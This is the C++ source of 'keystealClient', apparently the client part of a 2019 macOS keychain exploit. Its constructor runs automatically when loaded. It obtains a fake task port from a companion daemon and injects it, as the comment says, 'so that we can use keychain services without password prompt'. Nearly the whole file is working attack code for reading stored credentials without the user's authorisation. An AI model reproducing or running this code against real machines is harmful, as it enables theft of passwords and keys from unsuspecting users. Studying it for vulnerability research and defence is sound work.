//
//  main.cpp
//  keystealClient
//
//  Created by Linus Henze on 21.01.19.
//  Copyright © 2019 Linus Henze. All rights reserved.
//

#include <Foundation/Foundation.h>
#include <xpc/xpc.h>
#include <Security/Security.h>
#include <mach/mach.h>
#include <bootstrap.h>

#include "inject.hpp"
#include "helper.hpp"

#define FATAL_ERROR(msg) printf("[!FATAL!] " msg "\n"); exit(-1)
#define LOG_ERROR(msg)   printf("[!] " msg "\n")
#define LOG_INFO(msg)    printf("[*] " msg "\n")
#define LOG_SUCCESS(msg) printf("[+] " msg "\n")

void __attribute__((constructor)) keyStealClient_main() {
    // Receive fake task port
    mach_port_t serverPort;
    kern_return_t kr = bootstrap_look_up(bootstrap_port, (char*)"de.linushenze.keySteal", &serverPort);
    
    if (kr != KERN_SUCCESS) {
        LOG_ERROR("Failed to look up service! Did you run the keysteal daemon?");
        exit(-1);
    }
    
    mach_port_t localPort;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &localPort);
    mach_port_insert_right(mach_task_self(), localPort, localPort, MACH_MSG_TYPE_MAKE_SEND);
    
    if (sendRequest(serverPort, localPort)) {
        LOG_ERROR("Failed to send request!");
        exit(-1);
    }
    
    mach_port_t fakeTaskPort = recvPort(localPort);
    
    mach_port_destroy(mach_task_self(), localPort);
    
    // Inject fake task port so that we can use keychain services without password prompt
    inject_fake_task_port(fakeTaskPort);
}
